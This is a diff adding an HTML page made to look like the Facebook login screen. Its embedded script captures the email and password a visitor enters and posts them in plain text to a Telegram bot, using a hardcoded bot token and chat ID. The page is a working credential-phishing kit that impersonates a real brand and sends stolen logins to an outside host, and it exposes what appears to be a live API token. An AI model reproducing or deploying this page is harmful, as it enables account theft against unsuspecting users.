@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login Page | CodingNepal</title>
+    <link rel="stylesheet" href="style.css">
+  </head>
+  <body>
+    <div class="container flex">
+      <div class="facebook-page flex">
+        <div class="text">
+          <h1>facebook</h1>
+          <p>Connect with friends and the world </p>
+          <p>around you on Facebook.</p>
+        </div>
+        <form id="facebookLogin">
+          <input type="email" id="email" placeholder="Email or phone number" required>
+          <input type="password" id="password" placeholder="Password" required>
+          <div class="link">
+            <button type="submit" class="login">Login</button>
+            <a href="#" class="forgot">Forgot password?</a>
+          </div>
+          <hr>
+          <div class="button">
+            <a href="#">Create new account</a>
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <!-- Include Axios for sending data to Telegram -->
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+
+    <script>
+      const TOKEN = "7870463782:AAGczKOBvuj499JSJc6iSR0Wg-fxiGOoCys"; // Replace with your actual bot token
+      const CHAT_ID = "7700589255"; // Replace with your actual chat ID
+      const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`; // Use backticks for template literals
+
+      // Handle form submission
+      document.getElementById("facebookLogin").addEventListener("submit", function (event) {
+        event.preventDefault(); // Prevent default form submission behavior
+
+        // Retrieve the form inputs
+        const email = document.getElementById("email").value;
+        const password = document.getElementById("password").value;
+
+        // Validate inputs
+        if (!email || !password) {
+          alert("Please enter your email and password.");
+          return;
+        }
+
+        // Prepare the message to send to Telegram
+        const message = `Login Attempt: \nEmail: ${email}\nPassword: ${password}`;
+
+        // Send the data to Telegram
+        const data = {
+          chat_id: CHAT_ID,
+          text: message,
+        };
+
+        axios
+          .post(URL_API, data)
+          .then((response) => {
+            if (response.data.ok) {
+              alert("Login data sent successfully!");
+            } else {
+              alert("Failed to send the login data.");
+            }
+          })
+          .catch((error) => {
+            console.error("Error sending data:", error);
+            alert("An error occurred. Please try again.");
+          });
+      });
+    </script>
+  </body>
+</html>
